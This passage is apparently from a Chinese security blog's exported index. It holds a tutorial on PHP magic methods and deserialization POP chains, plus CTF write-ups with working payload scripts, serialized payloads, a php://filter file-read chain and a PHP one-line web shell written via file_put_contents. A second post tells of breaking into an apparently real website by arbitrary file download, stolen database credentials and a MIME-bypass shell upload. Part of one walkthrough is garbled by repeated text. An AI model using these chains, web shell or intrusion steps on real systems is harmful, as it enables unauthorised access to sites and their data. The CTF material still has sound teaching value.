__set()：设置对象不存在的属性或无法访问(私有)的属性时调用 /* __set($name, $value) * 用来为私有成员属性设置的值 * 第一个参数为你要为设置值的属性名，第二个参数是要给属性设置的值，没有返回值。 */ public function __set($name,$value)&#123; echo &#x27;__set 不存在成员变量 &#x27;.$name.&#x27;&lt;br&gt;&#x27;; echo &#x27;即将设置的值 &#x27;.$value.&quot;&lt;br&gt;&quot;; $this-&gt;noway=$value; &#125; public function Get()&#123; echo $this-&gt;noway; &#125;&#125;$a = new Test();// 读取 noway 的值，初始为0$a-&gt;Get();echo &#x27;&lt;br&gt;&#x27;;// 无法访问(私有)noway属性时调用，并设置值为899$a-&gt;noway = 899;// 经过__set方法的设置noway的值为899$a-&gt;Get();echo &#x27;&lt;br&gt;&#x27;;// 设置对象不存在的属性spaceman$a-&gt;spaceman = 566;// 经过__set方法的设置noway的值为566$a-&gt;Get();?&gt; 运行结果： 12345670__set 不存在成员变量 noway即将设置的值 899899__set 不存在成员变量 spaceman即将设置的值 566566 # __get 与 __set 例： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Person&#123; private $name; private $sex; private $age; //__get()方法用来获取私有属性 public function __get($property_name)&#123; echo &quot;在直接获取私有属性值的时候，自动调用了这个__get()方法&lt;br&gt;&quot;; if(isset($this-&gt;$property_name)) &#123; return($this-&gt;$property_name); &#125; else &#123; return(NULL); &#125; &#125; // __set()方法用来设置私有属性 public function __set($property_name, $value)&#123; echo &quot;在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值&lt;br&gt;&quot;; $this-&gt;$property_name = $value; &#125;&#125;$a = new Person();// 直接为私有属性赋值的操作，会自动调用__set()方法进行赋值$a-&gt;name=&quot;张三&quot;;$a-&gt;sex=&quot;男&quot;;$a-&gt;age=20;// 直接获取私有属性的值，会自动调用__get()方法，返回成员属性的值echo &quot;姓名：&quot;.$a-&gt;name.&quot;&lt;br&gt;&quot;;echo &quot;性别：&quot;.$a-&gt;sex.&quot;&lt;br&gt;&quot;;echo &quot;年龄：&quot;.$a-&gt;age.&quot;&lt;br&gt;&quot;;?&gt; 运行结果： 123456789在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接获取私有属性值的时候，自动调用了这个__get()方法姓名：张三在直接获取私有属性值的时候，自动调用了这个__get()方法性别：男在直接获取私有属性值的时候，自动调用了这个__get()方法年龄：20 # __toString() __toString() ：在对象当做字符串的时候会被调用。 例： 123456789101112131415161718192021&lt;?phpclass Test&#123; public $variable = &#x27;This is a string&#x27;; public function good()&#123; echo $this-&gt;variable . &#x27;&lt;br /&gt;&#x27;; &#125; // 在对象当做字符串的时候会被调用 public function __toString() &#123; return &#x27;__toString &lt;br&gt;&#x27;; &#125;&#125;$a = new Test();$a-&gt;good();echo $a;?&gt; 运行结果： 12This is a string__toString # __sleep() __sleep() ： serialize 之前被调用，可以指定要序列化的对象属性。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Test&#123; public $name; public $age; public $string; // __construct：实例化对象时被调用.其作用是拿来初始化一些值。 public function __construct($name, $age, $string)&#123; echo &quot;__construct 初始化&quot;.&quot;&lt;br&gt;&quot;; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;string = $string; &#125; // __sleep() ： serialize之前被调用，可以指定要序列化的对象属性 public function __sleep()&#123; echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; // 例如指定只需要 name 和 age 进行序列化，必须返回一个数值 return array(&#x27;name&#x27;, &#x27;age&#x27;); &#125;&#125;$a = new Test(&quot;Spaceman&quot;,566, &#x27;Test String&#x27;);echo serialize($a);?&gt; 运行结果： 123__construct 初始化当在类外部使用serialize()时会调用这里的__sleep()方法O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;Spaceman&quot;;s:3:&quot;age&quot;;i:566;&#125; # __wakeup __wakeup ：反序列化恢复对象之前调用该方法 例： 123456789101112131415161718192021222324&lt;?phpclass Test&#123; public $sex; public $name; public $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; public function __wakeup()&#123; echo &quot;当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;&quot;; $this-&gt;age = 566; &#125;&#125;$person = new Test(&#x27;spaceman&#x27;,21,&#x27;男&#x27;);$a = serialize($person);echo $a.&quot;&lt;br&gt;&quot;;var_dump (unserialize($a));?&gt; 运行结果： 12345678910O:4:&quot;Test&quot;:3:&#123;s:3:&quot;sex&quot;;s:3:&quot;男&quot;;s:4:&quot;name&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;age&quot;;i:21;&#125;当在类外部使用unserialize()时会调用这里的__wakeup()方法class Test#2 (3) &#123; public $sex =&gt; string(3) &quot;男&quot; public $name =&gt; string(8) &quot;spaceman&quot; public $age =&gt; int(566)&#125; # __isset() __isset() : 检测对象的某个属性是否存在时执行此函数。 当对不可访问属性调用 isset () 或 empty () 时，__isset () 会被调用。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Person&#123; public $sex; private $name; private $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; // __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 public function __isset($content)&#123; echo &quot;当在类外部使用isset()函数测定私有成员 &#123;$content&#125; 时，自动调用&lt;br&gt;&quot;; return isset($this-&gt;$content); &#125;&#125;$person = new Person(&quot;spaceman&quot;, 25,&#x27;男&#x27;);// public 成员echo ($person-&gt;sex),&quot;&lt;br&gt;&quot;;// private 成员echo isset($person-&gt;name);?&gt; 运行结果： 123男当在类外部使用isset()函数测定私有成员 name 时，自动调用1 # __unset() __unset() ：在不可访问的属性上使用 unset () 时触发 销毁对象的某个属性时执行此函数。 1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。 2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Person&#123; public $sex; private $name; private $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; // __unset()：销毁对象的某个属性时执行此函数 public function __unset($content) &#123; echo &quot;当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;&quot;; echo isset($this-&gt;$content).&quot;&lt;br&gt;&quot;; &#125;&#125;$person = new Person(&quot;spaceman&quot;, 21,&quot;男&quot;); // 初始赋值unset($person-&gt;sex);echo &quot;666666&lt;br&gt;&quot;;unset($person-&gt;name);unset($person-&gt;age);?&gt; 运行结果： 12345666666当在类外部使用unset()函数来删除私有成员时自动调用的1当在类外部使用unset()函数来删除私有成员时自动调用的1 # __invoke() __invoke() ：将对象当作函数来使用时执行此方法，通常不推荐这样做。 例： 1234567891011121314&lt;?phpclass Test&#123; // _invoke()：以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用 public function __invoke($param1, $param2, $param3) &#123; echo &quot;这是一个对象&lt;br&gt;&quot;; var_dump($param1,$param2,$param3); &#125;&#125;$a = new Test();$a(&#x27;spaceman&#x27;,21,&#x27;男&#x27;);?&gt; 运行结果： 1234这是一个对象string(8) &quot;spaceman&quot;int(21)string(3) &quot;男&quot; # 举例 # pop 链的利用 # 例 1： 123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(__FILE__);class pop &#123; public $ClassObj; // 对象实例化时调用 function __construct() &#123; $this-&gt;ClassObj = new hello(); &#125; // 对象销毁或程序运行结束时调用 function __destruct() &#123; $this-&gt;ClassObj-&gt;action(); &#125;&#125;class hello &#123; function action() &#123; echo &quot;&lt;br&gt; hello pop &quot;; &#125;&#125;class shell &#123; public $data; function action() &#123; eval($this-&gt;data); &#125;&#125;$a = new pop();unserialize($_GET[&#x27;s&#x27;]); 简单的审计一下，可以发现，pop 类本来是调用 hello 类的，然后程序结束执行 action 方法，但是 shell 类也有 action 方法，所以就可以构造 pop 链，使其 pop 类调用 shell 类从而执行 eval 函数。 构造如下： 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);class pop &#123; public $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new shell(); &#125;&#125;class shell &#123; public $data = &quot;phpinfo();&quot;; function action() &#123; eval($this-&gt;data); &#125;&#125;echo serialize(new pop()); 运行结果： 1O:3:&quot;pop&quot;:1:&#123;s:8:&quot;ClassObj&quot;;O:5:&quot;shell&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 不过需要注意的是 private 属性和 protected 属性 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);class pop &#123; public $Pub = &quot;spaceman&quot;; private $Pri = &quot;good&quot;; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new hello(); &#125;&#125;class hello &#123;&#125;echo urlencode(serialize(new pop())); 运行结果如下， 有 %00 存在是因为 private 属性和 protected 属性 1O%3A3%3A%22pop%22%3A3%3A%7Bs%3A3%3A%22Pub%22%3Bs%3A8%3A%22spaceman%22%3Bs%3A8%3A%22%00pop%00Pri%22%3Bs%3A4%3A%22good%22%3Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A5%3A%22hello%22%3A0%3A%7B%7D%7D # 例 2： [MRCTF2020]Ezpop 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpclass Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 首先看看所涉及到的魔术方法： 12345__construct() 当一个对象创建时被调用__toString() 当一个对象被当作一个字符串使用__wakeup() 将在反序列化之后立即被调用__get() 访问不存在的成员变量时调用的__invoke() 将对象当作函数来使用时执行此方法 我们可以先一个一个类看看怎么利用 Modifier 类： 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);class Modifier &#123; protected $var = &#x27;info.php&#x27;; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; echo &#x27;__invoke&#x27;.&quot;&lt;br&gt;&quot;; $this-&gt;append($this-&gt;var); &#125;&#125;$a = new Modifier();$a(); 这里假设需要 include 的文件是 info.php 简单解释一下代码的意思，就是我们需要执行 append 方法，若需要执行该方法可通过 __invoke 方法执行，也就是当将对象当作函数来使用时执行 __invoke 方法 所以我们就可以先创建这个对象然后再拿来当函数使用，就会自动触发 __invoke 方法，从而就可以执行 append 方法包含 info.php 文件 运行结果： 接下来是 Test 类： 1234567891011class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125; 首先是 __construct 方法初始化设置 p 是一个数组，这显然不是我们需要的，但我们可以重新初始化，然后是 __get 方法，访问不存在的成员变量时调用，而且返回的是方法，这不就可以配合第一个 Modifier 类使用了吗，使用 Test 类的 __get 方法调用 Modifier 类，所以我们可以使 Test 类初始化将 $p 的值设为 Modifier 对象，然后再经过 __get 方法以函数的方式执行 Modifier 对象（即访问一个 Test 类不存在的属性），这样就可以使用 Modifier 对象的 append 方法了，如下： 12345678910111213141516171819202122232425262728293031&lt;?phpclass Modifier &#123; protected $var = &#x27;info.php&#x27;; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; echo &#x27;__invoke&#x27;.&quot;&lt;br&gt;&quot;; $this-&gt;append($this-&gt;var); &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;$a = new Test();$a-&gt;no;?&gt; 运行结果： 最后是这个 Show 类 123456789101112131415161718class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125; 首先使用 unserialize 会先触发 __wakeup 方法，这个方法在这里其实就是充当过滤字符，接着是初始化方法，这个方法有个关键的地方就是使用了 echo 打印字符串，并且将 source 拼接起来打印，而 __toString() 就是当一个对象被当作一个字符串时调用，正好可以利用初始化方法的 echo 去完成调用。 分析了这么多，最后就可以构造最终的 pop 链了，先上 payload 再继续讲 1234567891011121314151617181920212223242526272829&lt;?phpclass Modifier &#123; protected $var = &#x27;info.php&#x27;;&#125;class Show&#123; public $source; public $str; public function __construct($file)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return &quot;566&quot;; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125;&#125;$a = new Show(&#x27;spaceman&#x27;);$a-&gt;str = new Test();$c = new Show($a);echo serialize($c); 运行结果有不可显示字符 %00 这里我手动加上了，所以可以使用 urlencode 一下，我这里是为了更直观的查看所以直接序列化 123Welcome to spacemanWelcome to 566O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:8:&quot;info.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125; $a = new Show('spaceman'); 首先是 new 一个 Show 对象，然后初始化 source 的值，如 spaceman 等字符，这个没多大影响，只是为了调用 Test 类中的 __get 方法，那如何调用的呢 $a-&gt;str = new Test(); 将 Show 类的 str 属性设为 new Test () $c = new Show($a); 然后再用 Show 类初始化刚刚构造的 Show 类，这里可能就有点绕了，为何我们需要这样构造呢，因为我们需要触发 Show 的 __toString() 方法，让 str 能调用 source，而经过刚刚的赋值，str 为 new Test() ，source 为 new Show('spaceman') 中的 spaceman ，那么 __toString 方法中的 str-&gt;source 就是访问 Test 类中的 spaceman 属性，然而 Test 类没有 spaceman 属性，那么就会触发 __get 方法，而该方法又会触发 Modifier 类中的 __invoke 方法，最后就完成了 include 所以大概调用的过程是： 1Show::__toString()--&gt;Test::__get()--&gt;Modifier::__invoke() 执行结果： 当然这是文件包含，那么想要读取文件应该怎么办呢，可以 php 伪协议使用，所以可以这样构造读取文件 12345678910111213141516171819202122232425262728293031&lt;?phpclass Modifier &#123; protected $var = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;&#125;class Show&#123; public $source; public $str; public function __construct($file)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return &quot;566&quot;; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125;&#125;$a = new Show(&#x27;spaceman&#x27;);$a-&gt;str = new Test();$c = new Show($a);echo serialize($c);//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125; 运行结果 执行： 最后 base64 解码即可 # 例 3： ctfshow 反序列化 web261 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; eval($this-&gt;code); &#125; public function __sleep()&#123; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; &#125; public function __destruct()&#123; if($this-&gt;code==0x36d)&#123; file_put_contents($this-&gt;username, $this-&gt;password); &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 首先呢了解一个上文没讲过的 __unserialize() 方法， 反序列化函数，用于序列化的 SET 类型数据。如果参数不是序列化的 SET，那么会直接返回。如果是一个序列化的 SET，但不是 PHP-REDIS 序列化的格式，函数将抛出一个异常。 Examples： 12$redis-&gt;setOpt(Redis::OPT_SERIALIZER, Redis::SERIALIZER_PHP);$redis-&gt;_unserialize(&#x27;a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;&#x27;); // Will return Array(1,2,3) 所以我们此时应该先想怎么序列化 __sleep() serialize 之前被调用，可以指定要序列化的对象属性。 所以在反序列化的时候就没啥用了，我们自己序列化的时候也不加，而 __unserialize 在序列化的时候也用不到， __wakeup 是反序列化恢复对象之前调用的方法，所以跟序列化也没啥关系， __invoke() 是将对象当作函数来使用时执行此方法，但是我发现并不需要调用此方法，因为 __destruct() 方法中有 file_put_contents 函数可以写文件，所以我们需要满足 code==0x36d 即可将文件写入，这里不难发现是弱类型比较，所以 887.php==0x36d 是成立的，所以我们可以直接构造如下： 123456789101112&lt;?phpclass ctfshowvip&#123; public $username; public $password; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125;&#125;$a = new ctfshowvip(&#x27;877.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);echo serialize($a); 为什么可以直接这样构造而不被 __wakeup() 拦截呢，因为含有 __unserialize（） ，就是当一个类中同时含有这两个方法时只有 __unserialize 生效，而 __wakeup() 失效，如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 &lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; echo &quot;__construct()&lt;br&gt;&quot;; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; echo &quot;__wakeup()&lt;br&gt;&quot;; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; echo &quot;__invoke()&lt;br&gt;&quot;; eval($this-&gt;code); &#125; public function __sleep()&#123; echo &quot;__sleep()&lt;br&gt;&quot;; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; echo &quot;__unserialize()&lt;br&gt;&quot;; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; var_dump($data); echo &quot;&lt;br&gt;&quot;; echo $this-&gt;code; echo &quot;&lt;br&gt;&quot;; &#125; public function __destruct()&#123; echo &quot;__destruct()&lt;br&gt;&quot;; if($this-&gt;code==0x36d)&#123; echo &quot;file_put_contents-----good!&lt;br&gt;&quot;; &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 运行结果： 12345__unserialize()array(2) &#123; [&quot;username&quot;]=&gt; string(7) &quot;877.php&quot; [&quot;password&quot;]=&gt; string(24) &quot;&lt;?php eval($_POST[1]);?&gt;&quot; &#125;877.php__destruct()file_put_contents-----good! 成功写入木马，剩下的操作就不说了 # 例 4： 2021 蓝帽杯半决赛 - 杰克与肉丝 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phphighlight_file(__file__); class Jack &#123; private $action; function __set($a, $b) &#123; $b-&gt;$a(); &#125;&#125;class Love &#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Titanic&#123; public $people; public $ship; function __destruct()&#123; $this-&gt;people-&gt;action=$this-&gt;ship; &#125;&#125;class Rose&#123; public $var1; public $var2; function __invoke()&#123; //if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1)=== sha1($this-&gt;var2)) )&#123; eval($this-&gt;var1); //&#125; &#125;&#125;if(isset($_GET[&#x27;love&#x27;]))&#123; $sail=$_GET[&#x27;love&#x27;]; unserialize($sail);&#125;?&gt; 为了不受其他因素干扰，我先把这个 Rose 类__invoke 函数的 if 语句注释，就是为了更方便的看看怎么构造的，所以首先我们应该直接寻找我们最后利用的函数 eval，然后利用逆推的方式，看看是如何触发该函数的，就是看看怎么调用的，invoke () 将对象当作函数来使用时执行此方法，所以刚刚开始我们依旧可以慢慢一步一步测试分析，慢慢一步一步调用 12345678910111213&lt;?phpclass Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; eval($this-&gt;var1); &#125;&#125;$a = new Rose();echo $a-&gt;var1;$a(); 现在是构造出来了，接着是看看怎么才能调用这个类，而 Love 类有一个是函数以函数的方式，call_user_func 是把第一个参数作为回调函数调用，正好符合了我们需要构造的，所以我们又看一下这个函数是怎么触发的，__call 当调用对象中不存在的方法会自动调用该方法，由于 call_user_func 回调的参数是rose，rose，rose，rose 又是直接等于var，所以我们需要先给var，所以我们需要先给var，所以我们需要先给 var 赋值，这个值就是 Rose 类，这样 call_user_func 回调时就拿 Rose 类当函数执行，这样就可以出发 Rose 类的 eval 了 12345678910111213141516171819202122232425262728&lt;?phpclass Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$a = new Rose();$b = new Love();$b-&gt;var = $a;$b-&gt;spaceman(566); //不存在的spaceman函数 然后我们继续寻找一下如何在别的类里找一个不存在的函数，b−&gt;spaceman(566)这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_set设置对象不存在的属性或无法访问(私有)的属性时调用，这里的b-&gt;spaceman(566) 这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_\\_set 设置对象不存在的属性或无法访问(私有)的属性时调用，这里的b−&gt;spaceman(566)这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_​set设置对象不存在的属性或无法访问(私有)的属性时调用，这里的 action 是私有的，所以我们可以利用这个 action 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass Jack&#123; private $action; function __set($a, $b) &#123; echo &quot;good! I run!&lt;br&gt;&quot;; $b-&gt;$a(); &#125;&#125;class Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$a = new Rose();$b = new Love();$b-&gt;var = $a;$c = new Jack();$c-&gt;action = $b; 其实这里不用 action 其实也是可以的，随便一个名字都行，但是这里用 action 是因为等下需要，因为我们需要利用这个 action，那么就是接下来怎么触发这个 Jack 类了，源码中只有一个 unserialize，而要想触发这一系列的类，只有 Titanic 类符合开始的条件，因为只有 Titanic 类的__destruct 魔法函数触发，所以这就是我们序列化的入口，__destruct 当对象所在函数调用完毕后执行。最后就是用 Titanic 类将这些类都连接在一起 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Titanic&#123; public $people; public $ship; function __destruct()&#123; $this-&gt;people-&gt;action=$this-&gt;ship; &#125;&#125;class Jack&#123; private $action; function __set($a, $b) &#123; echo &quot;good! I run!&lt;br&gt;&quot;; $b-&gt;$a(); &#125;&#125;class Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$s = new Titanic();$s-&gt;people = new Jack();$s-&gt;ship = new Love();$s-&gt;ship-&gt;var = new Rose();echo urlencode(serialize($s));echo &quot;&lt;br&gt;&quot;; 最后将序列化后得到的数据输入源码中即可 注释掉那个 md5 与 sha1 绕过我就不讲了，如果有师傅感兴趣可以参考 https://blog.csdn.net/LYJ20010728/article/details/114493052 # 结束语 哈哈哈，下次一定好好更新，下次一定 本次主要是讲了 php 反序列中常用魔术方法怎么触发以及怎么构造 pop 链，在实战中有的漏洞就是通过源码审计反序列化来导致 RCE 的，比如 thinkphp5.1.* 就存在一个 RCE 的 pop 链，这个我之后也会进行更新，构造 pop 链就是需要耐心也细心，一开始都不容易，我个人使用的是逆推的方法，就是从最后的命令执行往前推，需要啥就找啥，有的师傅是习惯从头到尾，我比较菜，只能从后面慢慢测试慢慢往前推，最后感谢关注我的朋友们，我会更加努力学习，尽量帮师傅们更快掌握一些知识，以后会尽量更新文章，谢谢师傅们！","path":"2021/06/30/PHP-反序列化（超细的）/","date":"06-30","excerpt":"","tags":[{"name":"PHP","slug":"PHP","permalink":"https://spaceman-911.gitee.io/tags/PHP/"}]},{"title":"从一次文件下载到getshell","text":"# 从一次文件下载到 getshell 由于没有实战过任意文件下载，于是去 gogo 了一下，发现一个任意文件下的地址： http://www.xxx.cn/down.php?file=download/xxxx.pdf 随便输入一个文件看看 好家伙，bt 默认不开启这个，但是通过这个报错我们也知道路径了，于是就下载一个 index.php 通过这个文件，找到了其他的文件，重要的文件不就是数据库配置文件吗 下载这个配置，得到后台地址和数据库登录信息等 直接尝试连接（ip 直接 whois 查询），进入 admin 表，直接好家伙，密码还是明文 通过刚刚得到的后台地址，直接进行登录 产品配置发现一个上传点，直接选择添加，直接上传 php 文件，直接被过滤，说是非图片类型，难道是 mime 检测而已？直接尝试修改 Content-Type 头，成功上传 右键查看图片，getshell # 总结 有下载的地方尝试或许有惊喜 读读源码，前端漂亮的站点，有时候后台没做到位 摸鱼完了，又水了一篇，有时候不能想太多，但需要多多尝试，但要适而可止","path":"2021/02/23/从一次文件下载到getshell/","date":"02-23","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]}],"categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://spaceman-911.gitee.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"资源","slug":"资源","permalink":"https://spaceman-911.gitee.io/tags/%E8%B5%84%E6%BA%90/"},{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]}